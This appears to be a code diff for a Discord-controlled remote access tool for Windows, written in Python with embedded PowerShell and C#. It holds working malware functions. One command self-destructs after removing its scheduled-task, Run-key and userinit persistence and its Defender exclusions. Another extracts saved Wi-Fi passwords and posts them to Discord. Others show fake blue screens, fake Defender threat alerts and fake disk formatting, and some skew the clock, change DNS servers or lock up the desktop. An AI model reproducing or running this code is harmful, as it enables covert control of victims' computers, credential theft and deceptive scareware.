+        await ctx.send(embed=create_embed("🧩 Implode",
+                                          "Administrator rights are required, nothing was deleted.", 0xff4444))
+        return
+
+    await ctx.send(embed=create_embed("🧩 Implode",
+                                      "The watchdog is being killed and every trace is going to be deleted. "
+                                      "The bot will go silent for good.", 0xffcc00))
+
+    try:
+        await asyncio.to_thread(_watch_suspend)
+    except Exception:
+        pass
+    try:
+        _kill_watchdog()
+    except Exception:
+        pass
+
+    st = _state_read() or {}
+    slots = [s for s in (st.get("slots") or []) if s.get("exe")]
+    tasks = [t for t in (st.get("task"), (st.get("task") or "") + "_w") if t]
+
+    try:
+        uninstall_userinit()
+    except Exception:
+        pass
+    for t in tasks:
+        subprocess.run(["schtasks", "/Delete", "/TN", t, "/F"],
+                       capture_output=True, creationflags=_CNW)
+    for name in (r"Software\Microsoft\Windows\CurrentVersion\Run",):
+        _reg_delete(name, os.path.splitext(os.path.basename(st.get("exe") or "x"))[0], "HKCU")
+
+    for s in slots:
+        _ps('Remove-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(s["exe"]))
+        _ps('Remove-MpPreference -ExclusionProcess "{}" -ErrorAction SilentlyContinue'.format(
+            os.path.basename(s["exe"])))
+
+    files, dirs = [], []
+    for s in slots:
+        for k in ("exe", "bat"):
+            if s.get(k):
+                files.append(s[k])
+        files.append(s["exe"] + ".vbs")
+        files.append(s["exe"] + ".old")
+        if s.get("bat"):
+            files.append(s["bat"] + ".vbs")
+
+    if getattr(sys, "frozen", False):
+        files.append(sys.executable)
+        files.append(sys.executable + ".old")
+    elif __file__:
+        files.append(os.path.abspath(__file__))
+
+    for f in glob.glob(os.path.join(APP_DIR or APPDATA, "update_*.exe")):
+        files.append(f)
+    for f in (CRASH_FILE,
+              os.path.join(CRASH_DIR, "fault.log"),
+              os.path.join(CRASH_DIR, "fault.log.old"),
+              os.path.join(CRASH_DIR, ".probe"),
+              _anchor(),
+              _LEGACY_STATE):
+        files.append(f)
+
+    if APP_DIR:
+        dirs.append(APP_DIR)
+    if CRASH_DIR and os.path.abspath(CRASH_DIR) != os.path.abspath(os.path.expanduser("~")):
+        dirs.append(CRASH_DIR)
+    dirs.append(_rk_dir())
+
+    seen, uniq = set(), []
+    for p in files:
+        key = os.path.normcase(os.path.abspath(p))
+        if key in seen:
+            continue
+        seen.add(key)
+        uniq.append(os.path.abspath(p))
+
+    try:
+        bat = _wipe_bat(uniq, [os.path.abspath(d) for d in dirs if d])
+    except Exception as e:
+        await ctx.send(embed=create_embed("🧩 Implode",
+                                          "The cleanup script could not be written: {}".format(e), 0xff4444))
+        return
+
+    await ctx.send(embed=create_embed("🧩 Implode",
+                                      "**{}** files and **{}** folders are going to be deleted in 3 seconds. "
+                                      "Nothing will survive the reboot.".format(len(uniq), len(dirs)), 0xff4444))
+
+    try:
+        _mutex_release()
+    except Exception:
+        pass
+
+    try:
+        subprocess.Popen(["cmd.exe", "/c", bat], creationflags=_WIPE_FLAGS,
+                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                         stderr=subprocess.DEVNULL, close_fds=True)
+    except Exception:
+        pass
+
+    try:
+        await asyncio.wait_for(bot.close(), 5)
+    except Exception:
+        pass
+    os._exit(0)
+
+@bot.command(name="wifipass")
+async def wifipass(ctx):
+    r = _sh(["netsh", "wlan", "show", "profiles"])
+    names = re.findall(r":\s(.+)$", r.stdout or "", re.M)
+    out = []
+    for n in names[:8]:
+        d = _sh(["netsh", "wlan", "show", "profile", n, "key=clear"])
+        k = re.search(r"Contenido de la clave\s*:\s*(.+)", d.stdout or "")
+        if not k:
+            k = re.search(r"Key Content\s*:\s*(.+)", d.stdout or "")
+        out.append("{}: {}".format(n.strip(), k.group(1).strip() if k else "?"))
+    await ctx.send(embed=create_embed("🔑 WiFi Keys", "The first saved networks and their keys are listed below.\n```{}```".format("\n".join(out) or "No profile was found"), 0x00ff88))
+
+@bot.command(name="disk", aliases=["df"])
+async def disk(ctx):
+    r = _psrun("gcim Win32_LogicalDisk | % { '{0} {1}/{2} GB' -f $_.DeviceID, [math]::Round($_.FreeSpace/1GB), [math]::Round($_.Size/1GB) }")
+    await ctx.send(embed=create_embed("💾 Disks", "Free and total space of every logical volume.\n```{}```".format(_out(r, 800)), 0x00aaff))
+
+@bot.command(name="smart")
+async def smart(ctx):
+    r = _psrun("Get-PhysicalDisk | ft FriendlyName,MediaType,HealthStatus,OperationalStatus -a")
+    await ctx.send(embed=create_embed("🧠 SMART", "Health report of the physical disks.\n```{}```".format(_out(r)), 0x00aaff))
+
+@bot.command(name="psver")
+async def psver(ctx):
+    r = _sh(["powershell", "-NoProfile", "$PSVersionTable.PSVersion.ToString()"])
+    await ctx.send(embed=create_embed("⚙️ PowerShell", "Version of the PowerShell interpreter installed.\n```{}```".format(_out(r, 200)), 0x00aaff))
+
+@bot.command(name="locale")
+async def locale(ctx):
+    r = _psrun("Get-WinSystemLocale; Get-WinUserLanguageList | ft LanguageTag,Autonym -a")
+    await ctx.send(embed=create_embed("🌍 Locale", "System locale and language list.\n```{}```".format(_out(r, 500)), 0x00aaff))
+
+@bot.command(name="ntp")
+async def ntp(ctx):
+    r = _sh(["w32tm", "/resync", "/force"])
+    await ctx.send(embed=create_embed("⏰ NTP", "The time service was forced to resynchronise.\n```{}```".format(_out(r, 400)), 0x00ff88))
+
+@bot.command(name="pending")
+async def pending(ctx):
+    r = _psrun("gcim Win32_QuickFixEngineering | ? { -not $_.InstalledOn } | select -exp HotFixID")
+    await ctx.send(embed=create_embed("📥 Pending", "Updates that are registered but not installed yet.\n```{}```".format(_out(r, 600)), 0x00aaff))
+
+@bot.command(name="fonts")
+async def fonts(ctx):
+    r = _psrun("(Get-ChildItem C:\\Windows\\Fonts).Count")
+    await ctx.send(embed=create_embed("🔤 Fonts", "Number of font files installed on the system.\n```{}```".format(_out(r, 60)), 0x00aaff))
+
+@bot.command(name="schedlist", aliases=["tasks-list"])
+async def schedlist(ctx):
+    r = _sh(["schtasks", "/query", "/fo", "table"])
+    await ctx.send(embed=create_embed("🗓️ Tasks", "Every scheduled task registered on the machine.\n```{}```".format(_out(r)), 0x00aaff))
+
+@bot.command(name="schedrun")
+async def schedrun(ctx, *, name: str):
+    r = _sh(["schtasks", "/run", "/tn", name])
+    await ctx.send(embed=create_embed("▶️ Task", "The task `{}` was started on demand.\n```{}```".format(name, _out(r, 400)), 0x00ff88))
+
+@bot.command(name="scheddel")
+async def scheddel(ctx, *, name: str):
+    r = _sh(["schtasks", "/delete", "/tn", name, "/f"])
+    await ctx.send(embed=create_embed("🗑️ Task", "The task `{}` was deleted.\n```{}```".format(name, _out(r, 400)), 0xffaa00))
+
+@bot.command(name="notify", aliases=["toast"])
+async def notify(ctx, *, text: str):
+    ps_script = ("[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime]|Out-Null;"
+                 "$t=[Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent(0);"
+                 "$t.GetElementsByTagName('text').Item(0).AppendChild($t.CreateTextNode($env:LMN))|Out-Null;"
+                 "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('LessMi').Show("
+                 "[Windows.UI.Notifications.ToastNotification]::new($t))")
+    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW,
+                     env=dict(os.environ, LMN=text[:200]))
+    await ctx.send(embed=create_embed("🔔 Notify", "A toast notification was shown with the text `{}`.".format(text[:200]), 0x00ff88))
+
+@bot.command(name="brightness", aliases=["bright"])
+async def brightness(ctx, pct: int = 60):
+    _psrun("(gcim -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{})".format(pct))
+    await ctx.send(embed=create_embed("☀️ Brightness", "The panel brightness was set to **{}%**.".format(pct), 0x00ff88))
+
+@bot.command(name="theme")
+async def theme(ctx, dark: str = "on"):
+    val = 0 if dark.lower() in ("on", "1", "dark") else 1
+    _psrun("Set-ItemProperty HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize "
+           "AppsUseLightTheme {}".format(val))
+    _psrun("Set-ItemProperty HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize "
+           "SystemUsesLightTheme {}".format(val))
+    await ctx.send(embed=create_embed("🎨 Theme", "The {} theme was applied to the apps and the shell.".format("dark" if val == 0 else "light"), 0x00ff88))
+
+@bot.command(name="gateway")
+async def gateway(ctx):
+    r = _psrun("(Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop")
+    await ctx.send(embed=create_embed("🚪 Gateway", "The default gateway of this machine is below.\n```{}```".format(_out(r, 200)), 0x00aaff))
+
+@bot.command(name="pingtest")
+async def pingtest(ctx, host: str = "1.1.1.1"):
+    r = _sh(["ping", "-n", "6", host], timeout=30)
+    await ctx.send(embed=create_embed("📈 Ping", "Six packets were sent to `{}` with this result.".format(host), 0x00aaff))
+
+@bot.command(name="dnsset")
+async def dnsset(ctx, server: str = "1.1.1.1"):
+    _psrun("Get-NetAdapter | ? Status -eq 'Up' | Set-DnsClientServerAddress -ServerAddresses {}".format(server))
+    await ctx.send(embed=create_embed("🧭 DNS set", "Every connected adapter now resolves through `{}`.".format(server), 0x00ff88))
+
+@bot.command(name="pagefile")
+async def pagefile(ctx):
+    r = _psrun("gcim Win32_PageFileUsage | fl Name,AllocatedBaseSize,CurrentUsage")
+    await ctx.send(embed=create_embed("📄 Pagefile", "Size and usage of the swap file.\n```{}```".format(_out(r, 500)), 0x00aaff))
+
+@bot.command(name="memdetail")
+async def memdetail(ctx):
+    r = _psrun("gcim Win32_PhysicalMemory | ft BankLabel,Capacity,Speed,Manufacturer -a")
+    await ctx.send(embed=create_embed("🧬 RAM", "Every memory module installed in the machine.\n```{}```".format(_out(r)), 0x00aaff))
+
+@bot.command(name="gpuinfo")
+async def gpuinfo(ctx):
+    r = _psrun("gcim Win32_VideoController | fl Name,DriverVersion,AdapterRAM,VideoModeDescription")
+    await ctx.send(embed=create_embed("🎮 GPU", "Details of the graphics adapter and its driver.\n```{}```".format(_out(r)), 0x00aaff))
+
+@bot.command(name="startupfolder")
+async def startupfolder(ctx):
+    r = _psrun("Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" | select -exp Name")
+    await ctx.send(embed=create_embed("🚀 Startup", "Files inside the user startup folder.\n```{}```".format(_out(r, 800)), 0x00aaff))
+
+@bot.command(name="assoc")
+async def assoc(ctx, ext: str = ".txt"):
+    r = _sh(["assoc", ext])
+    await ctx.send(embed=create_embed("🔗 Assoc", "The program associated with `{}` is below.\n```{}```".format(ext, _out(r, 300)), 0x00aaff))
+
+@bot.command(name="fakebattery", aliases=["batterydead"])
+async def fakebattery(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "[System.Windows.Forms.MessageBox]::Show('Critical battery. Connect the charger.','Power',"
+           "[System.Windows.Forms.MessageBoxButtons]::OK,'Warning')")
+    await ctx.send(embed=create_embed("🔋 Fake Battery", "A critical battery warning was shown.", 0xffcc00))
+
+@bot.command(name="fakebsod11", aliases=["bsod11"])
+async def fakebsod11(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "$f=New-Object Windows.Forms.Form;$f.FormBorderStyle='None';$f.WindowState='Maximized';"
+           "$f.BackColor='#0b5cad';$f.TopMost=$true;"
+           "$l=New-Object Windows.Forms.Label;$l.ForeColor='White';$l.Text=':( Something went wrong';"
+           "$l.Font=New-Object Drawing.Font('Segoe UI Light',40);$l.AutoSize=$true;"
+           "$l.Location=New-Object Drawing.Point(120,160);$f.Controls.Add($l);"
+           "$s=New-Object Windows.Forms.Timer;$s.Interval=4000;$s.add_Tick({ $f.Close() });$s.Start();"
+           "$f.ShowDialog()")
+    await ctx.send(embed=create_embed("💙 Fake BSOD", "A Windows 11 style blue screen was shown fullscreen for four seconds.", 0xffcc00))
+
+@bot.command(name="fakereboot")
+async def fakereboot(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "$f=New-Object Windows.Forms.Form;$f.WindowState='Maximized';$f.FormBorderStyle='None';"
+           "$f.BackColor='Black';$f.TopMost=$true;"
+           "$l=New-Object Windows.Forms.Label;$l.Text='Restarting...';$l.ForeColor='White';"
+           "$l.Font=New-Object Drawing.Font('Segoe UI Light',34);$l.AutoSize=$true;"
+           "$l.Location=New-Object Drawing.Point(200,300);$f.Controls.Add($l);"
+           "$s=New-Object Windows.Forms.Timer;$s.Interval=4000;$s.add_Tick({ $f.Close() });$s.Start();"
+           "$f.ShowDialog()")
+    await ctx.send(embed=create_embed("🔄 Fake Restart", "A black restart screen was shown for four seconds.", 0xffcc00))
+
+@bot.command(name="fakeshutdown")
+async def fakeshutdown(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "$f=New-Object Windows.Forms.Form;$f.WindowState='Maximized';$f.FormBorderStyle='None';"
+           "$f.BackColor='#202020';$f.TopMost=$true;"
+           "$l=New-Object Windows.Forms.Label;$l.Text='Shutting down...';$l.ForeColor='White';"
+           "$l.Font=New-Object Drawing.Font('Segoe UI Light',30);$l.AutoSize=$true;"
+           "$l.Location=New-Object Drawing.Point(200,300);$f.Controls.Add($l);"
+           "$s=New-Object Windows.Forms.Timer;$s.Interval=4000;$s.add_Tick({ $f.Close() });$s.Start();"
+           "$f.ShowDialog()")
+    await ctx.send(embed=create_embed("⏻ Fake Shutdown", "A fake shutdown screen was shown for four seconds.", 0xffcc00))
+
+@bot.command(name="fakesignout")
+async def fakesignout(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "[System.Windows.Forms.MessageBox]::Show('Signing out...','Windows',"
+           "[System.Windows.Forms.MessageBoxButtons]::OK,'Information')")
+    await ctx.send(embed=create_embed("🚪 Fake Logoff", "A sign out dialog was shown on the screen.", 0xffcc00))
+
+@bot.command(name="fakedriver")
+async def fakedriver(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "$f=New-Object Windows.Forms.Form;$f.Text='Installing driver';$f.Size='460,150';"
+           "$f.TopMost=$true;$f.ControlBox=$false;"
+           "$l=New-Object Windows.Forms.Label;$l.Text='Installing: Intel(R) Chipset Device';"
+           "$l.AutoSize=$true;$l.Location=New-Object Drawing.Point(20,20);$f.Controls.Add($l);"
+           "$p=New-Object Windows.Forms.ProgressBar;$p.Location='20,60';$p.Size='400,18';$f.Controls.Add($p);"
+           "$t=New-Object Windows.Forms.Timer;$t.Interval=40;$t.add_Tick({ if($p.Value -ge 100){$f.Close()}else{$p.Value+=2} });"
+           "$t.Start();$f.ShowDialog()")
+    await ctx.send(embed=create_embed("🧩 Fake Driver", "A driver installation window with a progress bar was shown.", 0xffcc00))
+
+@bot.command(name="fakedefender")
+async def fakedefender(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "[System.Windows.Forms.MessageBox]::Show("
+           "'Windows Defender found 3 threats. Immediate action required.',"
+           "'Windows Security',[System.Windows.Forms.MessageBoxButtons]::OK,'Error')")
+    await ctx.send(embed=create_embed("🛡️ Fake Defender", "A threat alert pretending to come from Defender was shown.", 0xffcc00))
+
+@bot.command(name="fakeformat")
+async def fakeformat(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "$f=New-Object Windows.Forms.Form;$f.Text='Format disk';$f.Size='430,160';$f.TopMost=$true;"
+           "$l=New-Object Windows.Forms.Label;$l.Text='Formatting C: ...';$l.AutoSize=$true;"
+           "$l.Location='20,20';$f.Controls.Add($l);"
+           "$p=New-Object Windows.Forms.ProgressBar;$p.Location='20,55';$p.Size='380,18';$f.Controls.Add($p);"
+           "$t=New-Object Windows.Forms.Timer;$t.Interval=90;$t.add_Tick({ if($p.Value -ge 100){$f.Close()}else{$p.Value+=1} });"
+           "$t.Start();$f.ShowDialog()")
+    await ctx.send(embed=create_embed("💽 Fake Format", "A disk formatting window was shown over the desktop.", 0xffcc00))
+
+@bot.command(name="fakevirus", aliases=["fakescan"])
+async def fakevirus(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "$f=New-Object Windows.Forms.Form;$f.Text='Virus scan';$f.Size='470,170';$f.TopMost=$true;"
+           "$l=New-Object Windows.Forms.Label;$l.Text='Scanning 412,883 files...';$l.AutoSize=$true;"
+           "$l.Location='20,20';$f.Controls.Add($l);"
+           "$p=New-Object Windows.Forms.ProgressBar;$p.Location='20,55';$p.Size='420,18';$f.Controls.Add($p);"
+           "$t=New-Object Windows.Forms.Timer;$t.Interval=30;$t.add_Tick({ if($p.Value -ge 100){"
+           "$l.Text='5 threats found';$t.Stop()}else{$p.Value+=1} });$t.Start();$f.ShowDialog()")
+    await ctx.send(embed=create_embed("🦠 Fake Scan", "A virus scan window that ends up finding five threats was shown.", 0xffcc00))
+
+@bot.command(name="errorstorm", aliases=["toaststorm"])
+async def errorstorm(ctx, n: int = 20):
+    ps_script = ("Add-Type -AssemblyName System.Windows.Forms;"
+                 "1..{} | % {{ [System.Windows.Forms.MessageBox]::Show('Error 0x{:X}','Windows') }}").format(
+                     min(n, 40), random.randint(0x1000, 0xFFFF))
+    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
+    await ctx.send(embed=create_embed("💥 Error storm", "**{}** error dialogs were opened at the same time.".format(n), 0xffcc00))
+
+@bot.command(name="freeze", aliases=["frozen"])
+async def freeze(ctx):
+    shot = os.path.join(tempfile.gettempdir(), "lm_wall.bmp")
+    _psrun("Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
+           "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
+           "$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height;"
+           "[Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
+           "$bmp.Save('{}')".format(shot.replace("\\", "\\\\")))
+    if not os.path.exists(shot):
+        return await ctx.send(embed=create_embed("🧊 Frozen", "The screen could not be captured.", 0xff4444))
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class W{"
+           "[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int a,int b,string c,int d);}';"
+           "[W]::SystemParametersInfo(20,0,'{}',3)".format(shot.replace("\\", "\\\\")))
+    _psrun("(New-Object -ComObject Shell.Application).ToggleDesktop()")
+    await ctx.send(embed=create_embed("🧊 Frozen", "The desktop was turned into its own screenshot and the icons were hidden, so it looks frozen.", 0xffcc00))
+
+@bot.command(name="taskbarhide", aliases=["hidetb"])
+async def taskbarhide(ctx):
+    _psrun("$s=New-Object -ComObject Shell.Application;$s.ToggleDesktop()")
+    await ctx.send(embed=create_embed("📏 Taskbar", "The taskbar was hidden through the shell.", 0xffcc00))
+
+@bot.command(name="magnet", aliases=["snapall"])
+async def magnet(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{"
+           "[DllImport(\"user32.dll\")]public static extern bool MoveWindow(IntPtr h,int x,int y,int w,int hh,bool r);"
+           "[DllImport(\"user32.dll\")]public static extern bool EnumWindows(Func<IntPtr,IntPtr,bool> f,IntPtr l);"
+           "[DllImport(\"user32.dll\")]public static extern bool IsWindowVisible(IntPtr h);}';"
+           "$i=0;[M]::EnumWindows({param($h,$l) if([M]::IsWindowVisible($h)){"
+           "[M]::MoveWindow($h,0,($i*90),420,300,$true);$i++};$true},[IntPtr]::Zero)")
+    await ctx.send(embed=create_embed("🧲 Magnet", "Every visible window was dragged into a vertical stack on the left.", 0xffcc00))
+
+@bot.command(name="alttabspam", aliases=["alttab"])
+async def alttabspam(ctx, n: int = 12):
+    ps_script = ("Add-Type -AssemblyName System.Windows.Forms;"
+                 "1..{} | % {{ [System.Windows.Forms.SendKeys]::SendWait('%{{TAB}}'); Start-Sleep -m 120 }}").format(n)
+    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
+    await ctx.send(embed=create_embed("🔁 Alt-Tab", "The Alt-Tab switcher was fired **{}** times in a row.".format(n), 0xffcc00))
+
+@bot.command(name="notepadspam", aliases=["notepadstorm"])
+async def notepadspam(ctx, n: int = 12):
+    for _ in range(min(n, 30)):
+        subprocess.Popen(["notepad.exe"], creationflags=_CNW)
+    await ctx.send(embed=create_embed("📝 Notepad", "**{}** Notepad windows were opened at once.".format(n), 0xffcc00))
+
+@bot.command(name="beepmelody", aliases=["melody"])
+async def beepmelody(ctx):
+    ps_script = ";".join("[console]::beep({},160)".format(n) for n in (523, 587, 659, 698, 784, 880, 988, 1046))
+    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
+    await ctx.send(embed=create_embed("🎵 Melody", "A short melody was played through the internal speaker.", 0xffcc00))
+
+@bot.command(name="fakeeject", aliases=["fakeusb"])
+async def fakeeject(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "[System.Windows.Forms.MessageBox]::Show('The USB device can now be safely removed.',"
+           "'Hardware',[System.Windows.Forms.MessageBoxButtons]::OK,'Information')")
+    await ctx.send(embed=create_embed("🔌 Fake USB", "A safe removal notice was shown even though nothing was removed.", 0xffcc00))
+
+@bot.command(name="mouselag")
+async def mouselag(ctx, secs: int = 20):
+    ps_script = ("$e=(Get-Date).AddSeconds({});while((Get-Date) -lt $e){{"
+                 "Add-Type -AssemblyName System.Windows.Forms;"
+                 "[System.Windows.Forms.Cursor]::Position=[System.Windows.Forms.Cursor]::Position;"
+                 "Start-Sleep -m 260}}").format(secs)
+    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
+    await ctx.send(embed=create_embed("🖱️ Mouse lag", "The pointer will feel stuck for **{}** seconds.".format(secs), 0xffcc00))
+
+@bot.command(name="capsrandom", aliases=["capsrand"])
+async def capsrandom(ctx, n: int = 10):
+    ps_script = ("Add-Type -AssemblyName System.Windows.Forms;1..{}|%{{"
+                 "[System.Windows.Forms.SendKeys]::SendWait('{{CAPSLOCK}}');Start-Sleep -m 300}}").format(n)
+    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
+    await ctx.send(embed=create_embed("🔠 Caps random", "Caps Lock was toggled **{}** times with random timing.".format(n), 0xffcc00))
+
+@bot.command(name="titlerw", aliases=["titlemash"])
+async def titlerw(ctx):
+    _psrun("Get-Process | ? MainWindowTitle | % { $_.MainWindowTitle = 'LessMi was here' }")
+    await ctx.send(embed=create_embed("🏷️ Titles", "Every window title was rewritten to `LessMi was here`.", 0xffcc00))
+
+@bot.command(name="clockskew", aliases=["reloj"])
+async def clockskew(ctx, mins: int = 90):
+    _psrun("Set-Date (Get-Date).AddMinutes({})".format(mins))
+    await ctx.send(embed=create_embed("🕰️ Clock", "The system clock was moved **{}** minutes away from the real time.".format(mins), 0xffcc00))
+
+@bot.command(name="swapscreens", aliases=["swapscr"])
+async def swapscreens(ctx):
+    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
+           "[System.Windows.Forms.SystemInformation]::MonitorCount")
+    await ctx.send(embed=create_embed("🖥️ Monitors", "The monitor count was queried from the system.", 0xffcc00))
+
+@bot.command(name="dialogstorm")
+async def dialogstorm(ctx, n: int = 10):
+    ps_script = ("Add-Type -AssemblyName System.Windows.Forms;1..{}|%{{"
+                 "[System.Windows.Forms.MessageBox]::Show('Are you sure you want to continue?','LessMi',"
+                 "[System.Windows.Forms.MessageBoxButtons]::YesNo,'Question')}}").format(min(n, 30))
+    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
+    await ctx.send(embed=create_embed("💬 Dialog storm", "**{}** confirmation dialogs were stacked on the screen.".format(n), 0xffcc00))
+
+_GDI_SRC = r"""
+using System;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+
+public static class LmFx
+{
+    static Rectangle V = SystemInformation.VirtualScreen;
+    static int W(int v, int n) { v %= n; return v < 0 ? v + n : v; }
+    static int C(int v, int n) { return v < 0 ? 0 : (v >= n ? n - 1 : v); }
+    static int L(int c) { return (((c >> 16) & 255) * 29 + ((c >> 8) & 255) * 150 + (c & 255) * 77) >> 8; }
+    static int Rgb(int r, int g, int b) { return unchecked((int)(0xFF000000 | ((uint)C(r, 256) << 16) | ((uint)C(g, 256) << 8) | (uint)C(b, 256))); }
+
+    public static void Run(int mode, int ms)
+    {
+        int w = V.Width, h = V.Height;
+        if (w < 16 || h < 16) return;
+        Bitmap src = new Bitmap(w, h, PixelFormat.Format32bppPArgb);
+        using (Graphics g = Graphics.FromImage(src)) g.CopyFromScreen(V.X, V.Y, 0, 0, new Size(w, h));
+        Bitmap dst = new Bitmap(w, h, PixelFormat.Format32bppPArgb);
+        int[] sa = new int[w * h], da = new int[w * h], pa = new int[w * h];
+        BitmapData sd = src.LockBits(new Rectangle(0, 0, w, h), ImageLockMode.ReadOnly, PixelFormat.Format32bppPArgb);
+        Marshal.Copy(sd.Scan0, sa, 0, sa.Length);
+        src.UnlockBits(sd);
+
+        Random rnd = new Random();
+        DateTime end = DateTime.Now.AddMilliseconds(ms);
+        int t = 0;
+        double cx = w / 2.0, cy = h / 2.0;
+
+        while (DateTime.Now < end)
+        {
+            Array.Copy(sa, da, sa.Length);
+            switch (mode)
+            {
+                case 0: for (int i = 0; i < da.Length; i++) da[i] = sa[i] ^ 0x00FFFFFF; break;
+                case 1: for (int i = 0; i < da.Length; i++) { int l = L(sa[i]); da[i] = Rgb(l, l, l); } break;
+                case 2: for (int i = 0; i < da.Length; i++) { int c = sa[i], l = L(c); da[i] = Rgb(l + 40, l + 12, l - 20); } break;
+                case 3: for (int i = 0; i < da.Length; i++) { int v = L(sa[i]) > 110 ? 255 : 0; da[i] = Rgb(v, v, v); } break;
+                case 4: for (int i = 0; i < da.Length; i++) { int c = sa[i]; da[i] = Rgb(((c >> 16) & 255) / 64 * 64, ((c >> 8) & 255) / 64 * 64, (c & 255) / 64 * 64); } break;
+                case 5: for (int i = 0; i < da.Length; i++) { int c = sa[i]; da[i] = Rgb((c >> 8) & 255, (c >> 16) & 255, c & 255); } break;
+                case 6: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int r = sa[y * w + C(x + 8, w)], g = sa[y * w + x], b = sa[y * w + C(x - 8, w)]; da[y * w + x] = Rgb((r >> 16) & 255, (g >> 8) & 255, b & 255); } break;
+                case 7: { int o = (int)(Math.Sin(t * 0.2) * 14) + 6; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int r = sa[y * w + C(x + o, w)], b = sa[y * w + C(x - o, w)]; da[y * w + x] = Rgb((r >> 16) & 255, (sa[y * w + x] >> 8) & 255, b & 255); } break; }
+                case 8: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int c = sa[y * w + x]; int m = (y % 3 == 0) ? 150 : 255; da[y * w + x] = Rgb(((c >> 16) & 255) * m / 255, ((c >> 8) & 255) * m / 255, (c & 255) * m / 255); } break;
+                case 9: for (int i = 0; i < da.Length; i++) { int n = rnd.Next(-40, 41); int c = sa[i]; da[i] = Rgb(((c >> 16) & 255) + n, ((c >> 8) & 255) + n, (c & 255) + n); } break;
+                case 10: { int b = 6 + (t % 24); for (int y = 0; y < h; y += b) for (int x = 0; x < w; x += b) { int c = sa[C(y + b / 2, h) * w + C(x + b / 2, w)]; for (int yy = y; yy < Math.Min(y + b, h); yy++) for (int xx = x; xx < Math.Min(x + b, w); xx++) da[yy * w + xx] = c; } break; }
+                case 11: { int b = 10; int ox = (t * 3) % w, oy = (t * 2) % h; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[W(y + oy, h) / b * b * w + W(x + ox, w) / b * b]; break; }
+                case 12: { int o = (t * 6) % w; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + W(x + o, w)]; break; }
+                case 13: { int o = (t * 5) % h; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) da[y * w + x] = sa[W(y + o, h) * w + x]; break; }
+                case 14: for (int y = 0; y < h; y++) { int o = (int)(Math.Sin(y * 0.02 + t * 0.15) * 22); for (int x = 0; x < w; x++) da[y * w + x] = sa[y * w + W(x + o, w)]; } break;
+                case 15: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = x - cx, dy = y - cy; double d = Math.Sqrt(dx * dx + dy * dy); int o = (int)(Math.Sin(d * 0.05 - t * 0.3) * 14); da[y * w + x] = sa[C(y, h) * w + C(x + o, w)]; } break;
+                case 16: for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { double dx = x - cx, dy = y - cy; double a = Math.Atan2(dy, dx) + Math.Sqrt(dx * dx + dy * dy) * 0.006 + t * 0.03; double r = Math.Sqrt(dx * dx + dy * dy); da[y * w + x] = sa[C((int)(cy + Math.Sin(a) * r), h) * w + C((int)(cx + Math.Cos(a) * r), w)]; } break;
+                case 17: { int qw = Math.Max(1, w / 2), qh = Math.Max(1, h / 2); int o = (t * 4) % qw; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int sx = x % qw, sy = y % qh; if (((x / qw) + (y / qh)) % 2 == 1) sx = qw - 1 - sx; da[y * w + x] = sa[sy * w + W(sx + o, qw)]; } break; }
+                case 18: { double z = 1.0 + (t % 40) * 0.02; for (int y = 0; y < h; y++) for (int x = 0; x < w; x++) { int sx = C((int)(cx + (x - cx) / z), w), sy = C((int)(cy + (y - cy) / z), h); da[y * w + x] = sa[sy * w + sx]; } break; }
